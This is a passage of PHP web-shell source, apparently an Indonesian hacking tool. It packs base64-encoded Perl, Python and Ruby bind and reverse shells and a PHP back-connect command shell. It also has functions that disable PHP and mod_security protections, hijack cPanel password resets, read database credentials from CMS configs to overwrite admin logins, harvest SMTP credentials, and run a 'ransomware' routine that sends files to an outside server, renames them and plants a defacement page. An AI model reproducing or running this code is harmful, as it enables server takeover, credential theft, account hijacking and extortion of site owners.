        $bp = base64_decode('IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=');
        $brt = @fopen('bp.pl', 'w');
        fwrite($brt, $bp);
        $out = exe('perl bp.pl '.$_POST['port'].' 1>/dev/null 2>&1 &');
        sleep(1);
        echo "<pre class='text-light'>$out\n".exe('ps aux | grep bp.pl').'</pre>';
        unlink('bp.pl');
    }
    if ($_POST['backconnect'] == 'perl') {
        $bc = base64_decode('IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7');
        $plbc = @fopen('bc.pl', 'w');
        fwrite($plbc, $bc);
        $out = exe('perl bc.pl '.$_POST['server'].' '.$_POST['port'].' 1>/dev/null 2>&1 &');
        sleep(1);
        echo "<pre class='text-light'>$out\n".exe('ps aux | grep bc.pl').'</pre>';
        unlink('bc.pl');
    }
    if ($_POST['backconnect'] == 'python') {
        $becaa = base64_decode('IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBNci54QmFyYWt1ZGFcblRoYW5rcyBHb29nbGUgRm9yIFJlZmVyZW5zaVxuXG4nJycpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMCkNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwxKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDIpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMykNCiAgICBzaGVsbCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ0KICBleGNlcHQgc29ja2V0LnRpbWVvdXQ6DQogICAgcHJpbnQgIlRpbU91dCINCiAgZXhjZXB0IHNvY2tldC5lcnJvciwgZToNCiAgICBwcmludCAiRXJyb3IiLCBlDQpweWJhY2tjb25uZWN0KCk=');
        $pbcaa = @fopen('bcpyt.py', 'w');
        fwrite($pbcaa, $becaa);
        $out1 = exe('python bcpyt.py '.$_POST['server'].' '.$_POST['port']);
        sleep(1);
        echo "<pre class='text-light'>$out1\n".exe('ps aux | grep bcpyt.py').'</pre>';
        unlink('bcpyt.py');
    }
    if ($_POST['backconnect'] == 'ruby') {
        $becaak = base64_decode('IyEvdXNyL2Jpbi9lbnYgcnVieQ0KIyBkZXZpbHpjMGRlLm9yZyAoYykgMjAxMg0KIw0KIyBiaW5kIGFuZCByZXZlcnNlIHNoZWxsDQojIGIzNzRrDQpyZXF1aXJlICdzb2NrZXQnDQpyZXF1aXJlICdwYXRobmFtZScNCg0KZGVmIHVzYWdlDQoJcHJpbnQgImJpbmQgOlxyXG4gIHJ1YnkgIiArIEZpbGUuYmFzZW5hbWUoX19GSUxFX18pICsgIiBbcG9ydF1cclxuIg0KCXByaW50ICJyZXZlcnNlIDpcclxuICBydWJ5ICIgKyBGaWxlLmJhc2VuYW1lKF9fRklMRV9fKSArICIgW3BvcnRdIFtob3N0XVxyXG4iDQplbmQNCg0KZGVmIHN1Y2tzDQoJc3Vja3MgPSBmYWxzZQ0KCWlmIFJVQllfUExBVEZPUk0uZG93bmNhc2UubWF0Y2goJ21zd2lufHdpbnxtaW5ndycpDQoJCXN1Y2tzID0gdHJ1ZQ0KCWVuZA0KCXJldHVybiBzdWNrcw0KZW5kDQoNCmRlZiByZWFscGF0aChzdHIpDQoJcmVhbCA9IHN0cg0KCWlmIEZpbGUuZXhpc3RzPyhzdHIpDQoJCWQgPSBQYXRobmFtZS5uZXcoc3RyKQ0KCQlyZWFsID0gZC5yZWFscGF0aC50b19zDQoJZW5kDQoJaWYgc3Vja3MNCgkJcmVhbCA9IHJlYWwuZ3N1YigvXC8vLCJcXCIpDQoJZW5kDQoJcmV0dXJuIHJlYWwNCmVuZA0KDQppZiBBUkdWLmxlbmd0aCA9PSAxDQoJaWYgQVJHVlswXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzBdKQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXNlcnZlciA9IFRDUFNlcnZlci5uZXcoIiIsIHBvcnQpDQoJcyA9IHNlcnZlci5hY2NlcHQNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fVxyXG4iDQoJYmVnaW4NCgkJaWYgbm90IHN1Y2tzDQoJCQlmID0gcy50b19pDQoJCQlleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgXDxcJiVkIFw+XCYlZCAyXD5cJiVkIixmLGYsZikNCgkJZWxzZQ0KCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQl3aGlsZSBsaW5lID0gcy5nZXRzDQoJCQkJcmFpc2UgZXJyb3JCcm8gaWYgbGluZSA9fiAvXmRpZVxyPyQvDQoJCQkJaWYgbm90IGxpbmUuY2hvbXAgPT0gIiINCgkJCQkJaWYgbGluZSA9fiAvY2QgLiovaQ0KCQkJCQkJbGluZSA9IGxpbmUuZ3N1YigvY2QgL2ksICcnKS5jaG9tcA0KCQkJCQkJaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUpDQoJCQkJCQkJbGluZSA9IHJlYWxwYXRoKGxpbmUpDQoJCQkJCQkJRGlyLmNoZGlyKGxpbmUpDQoJCQkJCQllbmQNCgkJCQkJCXMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+Ig0KCQkJCQllbHNpZiBsaW5lID1+IC9cdzouKi9pDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZS5jaG9tcCkNCgkJCQkJCQlEaXIuY2hkaXIobGluZS5jaG9tcCkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2UNCgkJCQkJCUlPLnBvcGVuKGxpbmUsInIiKXt8aW98cy5wcmludCBpby5yZWFkICsgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+In0NCgkJCQkJZW5kDQoJCQkJZW5kDQoJCQllbmQNCgkJZW5kDQoJcmVzY3VlIGVycm9yQnJvDQoJCXB1dHMgIioqKiAje25hbWV9OiN7cG9ydH0gZGlzY29ubmVjdGVkIg0KCWVuc3VyZQ0KCQlzLmNsb3NlDQoJCXMgPSBuaWwNCgllbmQNCmVsc2lmIEFSR1YubGVuZ3RoID09IDINCglpZiBBUkdWWzBdID1+IC9eWzAtOV17MSw1fSQvDQoJCXBvcnQgPSBJbnRlZ2VyKEFSR1ZbMF0pDQoJCWhvc3QgPSBBUkdWWzFdDQoJZWxzaWYgQVJHVlsxXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzFdKQ0KCQlob3N0ID0gQVJHVlswXQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXMgPSBUQ1BTb2NrZXQubmV3KCIje2hvc3R9IiwgcG9ydCkNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fSINCgliZWdpbg0KCQlpZiBub3Qgc3Vja3MNCgkJCWYgPSBzLnRvX2kNCgkJCWV4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSBcPFwmJWQgXD5cJiVkIDJcPlwmJWQiLCBmLCBmLCBmKQ0KCQllbHNlDQoJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCXdoaWxlIGxpbmUgPSBzLmdldHMNCgkJCQlyYWlzZSBlcnJvckJybyBpZiBsaW5lID1+IC9eZGllXHI/JC8NCgkJCQlpZiBub3QgbGluZS5jaG9tcCA9PSAiIg0KCQkJCQlpZiBsaW5lID1+IC9jZCAuKi9pDQoJCQkJCQlsaW5lID0gbGluZS5nc3ViKC9jZCAvaSwgJycpLmNob21wDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZSkNCgkJCQkJCQlsaW5lID0gcmVhbHBhdGgobGluZSkNCgkJCQkJCQlEaXIuY2hkaXIobGluZSkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2lmIGxpbmUgPX4gL1x3Oi4qL2kNCgkJCQkJCWlmIEZpbGUuZGlyZWN0b3J5PyhsaW5lLmNob21wKQ0KCQkJCQkJCURpci5jaGRpcihsaW5lLmNob21wKQ0KCQkJCQkJZW5kDQoJCQkJCQlzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCgkJCQkJZWxzZQ0KCQkJCQkJSU8ucG9wZW4obGluZSwiciIpe3xpb3xzLnByaW50IGlvLnJlYWQgKyAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4ifQ0KCQkJCQllbmQNCgkJCQllbmQNCgkJCWVuZA0KCQllbmQNCglyZXNjdWUgZXJyb3JCcm8NCgkJcHV0cyAiKioqICN7bmFtZX06I3twb3J0fSBkaXNjb25uZWN0ZWQiDQoJZW5zdXJlDQoJCXMuY2xvc2UNCgkJcyA9IG5pbA0KCWVuZA0KZWxzZQ0KCXVzYWdlDQoJZXhpdA0KZW5k');
        $pbcaak = @fopen('bcruby.rb', 'w');
        fwrite($pbcaak, $becaak);
        $out2 = exe('ruby bcruby.rb '.$_POST['server'].' '.$_POST['port']);
        sleep(1);
        echo "<pre class='text-light'>$out2\n".exe('ps aux | grep bcruby.rb').'</pre>';
        unlink('bcruby.rb');
    }
    if ($_POST['backconnect'] == 'php') {
        $ip = $_POST['server'];
        $port = $_POST['port'];
        $sockfd = fsockopen($ip, $port, $errno, $errstr);
        if ($errno != 0) {
            echo "<font color='red'>$errno : $errstr</font>";
        } elseif (!$sockfd) {
            $result = '<p>Unexpected error has occured, connection may have failed.</p>';
        } else {
            fwrite($sockfd, "
            \n{#######################################}
            \n..:: BackConnect PHP By Con7ext ::..
            \n{#######################################}\n");
            $dir = @shell_exec('pwd');
            $sysinfo = @shell_exec('uname -a');
            $time = @shell_exec('time');
            $len = 1337;
            fwrite($sockfd, 'User ', $sysinfo, 'connected @ ', $time, "\n\n");
            while (!feof($sockfd)) {
                $cmdPrompt = '[kuda]#:> ';
                @fwrite($sockfd, $cmdPrompt);
                $command = fgets($sockfd, $len);
                @fwrite($sockfd, "\n".@shell_exec($command)."\n\n");
            }
            @fclose($sockfd);
        }
    }
    exit;
}
function disabFunc($dir, $file) {
    echo "<div class='card card-body text-center text-dark'>
        <h4 class='text-center mt-2 mb-3'>Bypass Disable Functions</h2>
        <form method='POST'>
            <input type='submit' class='btn btn-danger' name='ini' value='php.ini'/>
            <input type='submit' class='btn btn-danger' name='htce' value='.htaccess'/>
            <input type='submit' class='btn btn-danger' name='litini' value='Litespeed'/>
        </form>";
    if (isset($_POST['ini'])) {
        $file = fopen('php.ini', 'w');
        echo fwrite($file, "safe_mode = OFF\ndisable_functions = NONE");
        fclose($file);
        echo "<a href='php.ini' class='btn btn-success btn-block' target='_blank'>Klik Coeg!</a>";
    } elseif (isset($_POST['htce'])) {
        $file = fopen('.htaccess', 'w');
        echo fwrite($file, "<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>");
        fclose($file);
        echo '<p>.htaccess successfully created!</p>';
    } elseif (isset($_POST['litini'])) {
        $iniph = 'PD8gZWNobyBpbmlfZ2V0KCJzYWZlX21vZGUiKTsNCmVjaG8gaW5pX2dldCgib3Blbl9iYXNlZGlyIik7DQplY2hvIGluY2x1ZGUoJF9HRVRbImZpbGUiXSk7DQplY2hvIGluaV9yZXN0b3JlKCJzYWZlX21vZGUiKTsNCmVjaG8gaW5pX3Jlc3RvcmUoIm9wZW5fYmFzZWRpciIpOw0KZWNobyBpbmlfZ2V0KCJzYWZlX21vZGUiKTsNCmVjaG8gaW5pX2dldCgib3Blbl9iYXNlZGlyIik7DQplY2hvIGluY2x1ZGUoJF9HRVRbInNzIl07DQo/Pg==';
        $byph = "safe_mode = OFF\ndisable_functions = NONE";
        $comp = "<Files *.php>\nForceType application/x-httpd-php4\n</Files>";
        file_put_contents('php.ini', $byph);
        file_put_contents('ini.php', $iniph);
        file_put_contents('.htaccess', $comp);
        $swa = 'success';
        $text = 'Disable Functions in Litespeed Created';
        swall($swa, $text, $dir);
    }
    echo '</div>';
}
function resetCp($dir) {
    echo '<h5 class="text-center mb-4"><i class="fa fa-key"></i> Auto Reset Password Cpanel</h5>
    <form method="POST">
        <div class="form-group input-group">
            <div class="input-group-prepend">
                <div class="input-group-text"><i class="fa fa-envelope"></i></div>
                </div>
                <input type="email" name="email" class="form-control" placeholder="Masukan Email..."/>
            </div>
            <input type="submit" name="submit" class="btn btn-danger btn-block" value="Send"/>
        </div>
    </form>';
    if (isset($_POST['submit'])) {
        $user = get_current_user();
        $site = $_SERVER['HTTP_HOST'];
        $ips = getenv('REMOTE_ADDR');
        $email = $_POST['email'];
        $wr = 'email:'.$email;
        $f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
        @fwrite($f, $wr);
        @fclose($f);
        $f = fopen('/home/'.$user.'/.contactinfo', 'w');
        @fwrite($f, $wr);
        @fclose($f);
        $parm = $site.':2082/resetpass?start=1';
        echo '<br/>Url: '.$parm.'';
        echo '<br/>Username: '.$user.'';
        echo '<br/>Success Reset To: '.$email.'<br/><br/>';
    }
    exit;
}
function autoEdit($dir, $file) {
    if ($_POST['hajar']) {
        if (strlen($_POST['pass_baru']) < 6 or strlen($_POST['user_baru']) < 6) {
            echo 'Username dan Password harus lebih dari 6 karakter';
        } else {
            $user_baru = $_POST['user_baru'];
            $pass_baru = md5($_POST['pass_baru']);
            $conf = $_POST['config_dir'];
            $scan_conf = scandir($conf);
            foreach ($scan_conf as $file_conf) {
                if (!is_file("$conf/$file_conf")) {
                    continue;
                }
                $config = file_get_contents("$conf/$file_conf");
                if (preg_match('/JConfig|joomla/', $config)) {
                    $dbhost = ambilkata($config, "host = '", "'");
                    $dbuser = ambilkata($config, "user = '", "'");
                    $dbpass = ambilkata($config, "password = '", "'");
                    $dbname = ambilkata($config, "db = '", "'");
                    $dbprefix = ambilkata($config, "dbprefix = '", "'");
                    $prefix = $dbprefix.'users';
                    $conn = mysqli_connect($dbhost, $dbuser, $dbpass);
                    $db = mysqli_select_db($conn, $dbname);
                    $q = mysqli_query($conn, "SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysqli_fetch_array($q);
                    $id = $result['id'];
                    $site = ambilkata($config, "sitename = '", "'");
                    $update = mysqli_query($conn, "UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
                    echo 'Config => '.$file_conf.'<br>';
                    echo 'CMS => Joomla<br>';
                    if ($site == '') {
                        echo 'Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>';
                    } else {
                        echo "Sitename => $site<br>";
                    }
                    if (!$update or !$conn or !$db) {
                        echo 'Status => <font color=red>'.mysqli_error($conn).'</font><br><br>';
                    } else {
                        echo 'Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>';
                    }
                    mysqli_close($conn);
                } elseif (preg_match('/WordPress/', $config)) {
                    $dbhost = ambilkata($config, "DB_HOST', '", "'");
                    $dbuser = ambilkata($config, "DB_USER', '", "'");
                    $dbpass = ambilkata($config, "DB_PASSWORD', '", "'");
                    $dbname = ambilkata($config, "DB_NAME', '", "'");
                    $dbprefix = ambilkata($config, "table_prefix  = '", "'");
                    $prefix = $dbprefix.'users';
                    $option = $dbprefix.'options';
                    $conn = mysqli_connect($dbhost, $dbuser, $dbpass);
                    $db = mysqli_select_db($conn, $dbname);
                    $q = mysqli_query($conn, "SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysqli_fetch_array($q);
                    $id = $result['id'];
                    $q2 = mysqli_query($conn, "SELECT * FROM $option ORDER BY option_id ASC");
                    $result2 = mysqli_fetch_array($q2);
                    $target = $result2['option_value'];
                    if ($target == '') {
                        $url_target = 'Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>';
                    } else {
                        $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
                    }
                    $update = mysqli_query($conn, "UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
                    echo 'Config => '.$file_conf.'<br>';
                    echo 'CMS => Wordpress<br>';
                    echo $url_target;
                    if (!$update or !$conn or !$db) {
                        echo 'Status => <font color=red>'.mysqli_error($conn).'</font><br><br>';
                    } else {
                        echo 'Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>';
                    }
                    mysqli_close($conn);
                } elseif (preg_match('/Magento|Mage_Core/', $config)) {
                    $dbhost = ambilkata($config, '<host><![CDATA[', ']]></host>');
                    $dbuser = ambilkata($config, '<username><![CDATA[', ']]></username>');
                    $dbpass = ambilkata($config, '<password><![CDATA[', ']]></password>');
                    $dbname = ambilkata($config, '<dbname><![CDATA[', ']]></dbname>');
                    $dbprefix = ambilkata($config, '<table_prefix><![CDATA[', ']]></table_prefix>');
                    $prefix = $dbprefix.'admin_user';
                    $option = $dbprefix.'core_config_data';
                    $conn = mysqli_connect($dbhost, $dbuser, $dbpass);
                    $db = mysqli_select_db($conn, $dbname);
                    $q = mysqli_query($conn, "SELECT * FROM $prefix ORDER BY user_id ASC");
                    $result = mysqli_fetch_array($q);
                    $id = $result['user_id'];
                    $q2 = mysqli_query($conn, "SELECT * FROM $option WHERE path='web/secure/base_url'");
                    $result2 = mysqli_fetch_array($q2);
                    $target = $result2['value'];
                    if ($target == '') {
                        $url_target = 'Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>';
                    } else {
                        $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
                    }
                    $update = mysqli_query($conn, "UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                    echo 'Config => '.$file_conf.'<br>';
                    echo 'CMS => Magento<br>';
                    echo $url_target;
                    if (!$update or !$conn or !$db) {
                        echo 'Status => <font color=red>'.mysqli_error($conn).'</font><br><br>';
                    } else {
                        echo 'Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>';
                    }
                    mysqli_close($conn);
                } elseif (preg_match('/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/', $config)) {
                    $dbhost = ambilkata($config, "'DB_HOSTNAME', '", "'");
                    $dbuser = ambilkata($config, "'DB_USERNAME', '", "'");
                    $dbpass = ambilkata($config, "'DB_PASSWORD', '", "'");
                    $dbname = ambilkata($config, "'DB_DATABASE', '", "'");
                    $dbprefix = ambilkata($config, "'DB_PREFIX', '", "'");
                    $prefix = $dbprefix.'user';
                    $conn = mysqli_connect($dbhost, $dbuser, $dbpass);
                    $db = mysqli_select_db($conn, $dbname);
                    $q = mysqli_query($conn, "SELECT * FROM $prefix ORDER BY user_id ASC");
                    $result = mysqli_fetch_array($q);
                    $id = $result['user_id'];
                    $target = ambilkata($config, "HTTP_SERVER', '", "'");
                    if ($target == '') {
                        $url_target = 'Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>';
                    } else {
                        $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
                    }
                    $update = mysqli_query($conn, "UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                    echo 'Config => '.$file_conf.'<br>';
                    echo 'CMS => OpenCart<br>';
                    echo $url_target;
                    if (!$update or !$conn or !$db) {
                        echo 'Status => <font color=red>'.mysqli_error($conn).'</font><br><br>';
                    } else {
                        echo 'Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>';
                    }
                    mysqli_close($conn);
                } elseif (preg_match('/panggil fungsi validasi xss dan injection/', $config)) {
                    $dbhost = ambilkata($config, 'server = "', '"');
                    $dbuser = ambilkata($config, 'username = "', '"');
                    $dbpass = ambilkata($config, 'password = "', '"');
                    $dbname = ambilkata($config, 'database = "', '"');
                    $prefix = 'users';
                    $option = 'identitas';
                    $conn = mysqli_connect($dbhost, $dbuser, $dbpass);
                    $db = mysqli_select_db($conn, $dbname);
                    $q = mysqli_query($conn, "SELECT * FROM $option ORDER BY id_identitas ASC");
                    $result = mysqli_fetch_array($q);
                    $target = $result['alamat_website'];
                    if ($target == '') {
                        $target2 = $result['url'];
                        $url_target = 'Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>';
                        if ($target2 == '') {
                            $url_target2 = 'Login => <font color=red>Error, Tidak dapat mengambil nama domainnya</font><br>';
                        } else {
                            $cek_login3 = file_get_contents("$target2/adminweb/");
                            $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
                            if (preg_match('/CMS Lokomedia|Administrator/', $cek_login3)) {
                                $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
                            } elseif (preg_match('/CMS Lokomedia|Lokomedia/', $cek_login4)) {
                                $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
                            } else {
                                $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                            }
                        }
                    } else {
                        $cek_login = file_get_contents("$target/adminweb/");
                        $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
                        if (preg_match('/CMS Lokomedia|Administrator/', $cek_login)) {
                            $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
                        } elseif (preg_match('/CMS Lokomedia|Lokomedia/', $cek_login2)) {
                            $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
                        } else {
                            $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
                        }
                    }
                    $update = mysqli_query($conn, "UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
                    echo 'Config => '.$file_conf.'<br>';
                    echo 'CMS => Lokomedia<br>';
                    if (preg_match('/Error, Tidak dapat mengambil nama domainnya/', $url_target)) {
                        echo $url_target2;
                    } else {
                        echo $url_target;
                    }
                    if (!$update or !$conn or !$db) {
                        echo 'Status => <font color=red>'.mysqli_error($conn).'</font><br><br>';
                    } else {
                        echo 'Status => <font color=lime>Sukses, Silakan login dengan User & Password yang baru.</font><br><br>';
                    }
                    mysqli_close($conn);
                }
            }
        }
    } else {
        echo "<h3 class='text-center mb-4'>Auto Edit User</h3>
        <form method='post'>
            <h5>Lokasi Dir Config</h5>
            <input type='text' class='form-control mb-3' name='config_dir' value='$dir'>
            <h5>Set User & Pass :</h5>
            <input type='text' name='user_baru' value='indosec' class='form-control mb-3' placeholder='Set Username'>
            <input type='text' name='pass_baru' value='indosec' class='form-control mb-4' placeholder='Set Password'>
            <input type='submit' name='hajar' value='Edit User' class='btn btn-danger btn-block'>
        </form>
        <p class='text-muted mb-4'>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</p>";
    }
    exit;
}
function ransom($dir, $file) {
    if (isset($_POST['encrypt'])) {
        $dir = $_POST['target'];
        echo"<textarea class='form-control mb-4' rows='13' disabled=''>";
        function listFolderFiles($dir) {
            if (is_dir($dir)) {
                $ffs = scandir($dir);
                unset($ffs[array_search('.', $ffs, true)]);
                unset($ffs[array_search('..', $ffs, true)]);
                if (count($ffs) < 1) {
                    return;
                }
                foreach ($ffs as $ff) {
                    $files = $dir.'/'.$ff;
                    if (!is_dir($files)) {
                        /* encrypt file */
                        $file = file_get_contents($files);
                        $_a = base64_encode($file);
                        /* proses curl */
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, 'http://encrypt.indsc.me/api.php?type=encrypt');
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, "text=$_a");
                        $x = json_decode(curl_exec($ch));
                        if ($x->status == 'success') {
                            $_enc = base64_decode($x->data);
                            rename($files, $files.'.indsc');
                            echo "[+]$files => Success Encrypted\n";
                        }
                    }
                    if (is_dir($dir.'/'.$ff)) {
                        listFolderFiles($dir.'/'.$ff);
                    }
                }
                $index = file_get_contents('https://pastebin.com/raw/aGZ6BeTH');
                $_o = fopen($dir.'/index.html', 'w');
                fwrite($_o, $index);
                fclose($_o);
                echo "\n[+] Done !";
            } else {
                echo "\nBukan dir";
            }
        }
        listFolderFiles($dir);
        echo '</textarea><br/>';
    } else {
        echo '<form method="post">
            <div class="form-group">
                <h4 class="text-center mb-4"><i class="fa fa-lock"></i> Ransomware</h4>
                <label>Pilih Directory :</label>
                <div class="form-group input-group">
                    <div class="input-group-prepend">
                        <div class="input-group-text"><i class="fa fa-home"></i></div>
                    </div>
                    <input type="text" name="target" class="form-control" value="'.$dir.'"/>
                </div>
                <input type="submit" name="encrypt" class="btn btn-danger btn-block" value="Encrypt"/>
            </div>
        </form>';
    }
    exit;
}
function scj($dir) {
    $dirs = scandir($dir);
    foreach ($dirs as $dirb) {
        if (!is_file("$dir/$dirb")) {
            continue;
        }
        $ambil = file_get_contents("$dir/$dirb");
        $ambil = str_replace('$', '', $ambil);
        if (preg_match('/JConfig|joomla/', $ambil)) {
            $smtp_host = ambilkata($ambil, "smtphost = '", "'");
            $smtp_auth = ambilkata($ambil, "smtpauth = '", "'");
            $smtp_user = ambilkata($ambil, "smtpuser = '", "'");
            $smtp_pass = ambilkata($ambil, "smtppass = '", "'");
            $smtp_port = ambilkata($ambil, "smtpport = '", "'");
            $smtp_secure = ambilkata($ambil, "smtpsecure = '", "'");
            echo "<table class='text-white table table-bordered'>
                <tr>
                    <td>SMTP Host: $smtp_host</td>
                </tr>
                <tr>
                    <td>SMTP Port: $smtp_port</td>
                </tr>
                <tr>
